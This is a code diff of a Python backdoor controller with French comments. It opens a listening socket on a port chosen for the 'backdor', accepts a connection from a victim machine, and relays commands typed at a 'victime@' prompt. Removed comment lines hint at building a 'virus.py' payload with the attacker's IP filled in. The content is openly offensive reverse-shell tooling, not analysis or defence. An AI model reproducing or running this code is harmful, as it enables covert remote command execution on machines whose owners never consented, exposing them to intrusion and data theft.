@@ -11,13 +11,6 @@ os.system("clear")
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
 
-#fichier1 = open("partie1.txt", "r")
-#fichier2 = open("partie2.txt", "r")
-#fichier = open("virus.py", "w")
-#fichier.write(f"{fichier1} '{ip_address}'\n{fichier2}")
-#fichier.close()
-#fichier1.close()
-#fichier2.close()
 dmd = input(f"{Fore.BLUE}Would you like to reopen a remote connection? (y/n)>>")
 portpls = input(f"{Fore.BLUE}choose a port for the backdor please>>")#
 if(dmd == "n"):
@@ -51,7 +44,6 @@ s.listen(1)
 
 
 while True:
-    #print(Fore.RED, f"Please search in the folder Virus the application \"{name}\"")
     print(Fore.BLUE, "your ip address is: ", ip_address)
     print(f'\n{Fore.GREEN}[+] listening as {SERVER_IP,}:{PORT}\n')
 
@@ -61,10 +53,9 @@ while True:
     print(f'{Fore.GREEN}[+] client connected {SERVER_IP}:{PORT}\n')
     ip = client[0].recv(1024).decode('utf-8')
     print(Fore.RED, ip)
-    #client[0].send('connected'.encode())
 
     while True:
-        cmd = input(f'{Fore.GREEN}victime@{SERVER_IP}:{PORT}>')#\033[0;31mhello world en rouge\033[0;31m
+        cmd = input(f'{Fore.GREEN}victime@{SERVER_IP}:{PORT}>')
         if(cmd == ""):
             print(f"{Fore.RED}Rien n'a été entré!")
             cmd = input(f'{Fore.GREEN}victime@{SERVER_IP}:{PORT}>')
@@ -76,7 +67,6 @@ while True:
                 client[0].send(cmd.encode())
             else:
                 client[0].send(cmd.encode())
-        #affin de dire si entré et appuyé passer parse que rien n'est écrit ne rien envoyer et réafficher l'endroit pour la commande
         if cmd.lower() in ['quit', 'exit', 'q', 'x']:
             break
         
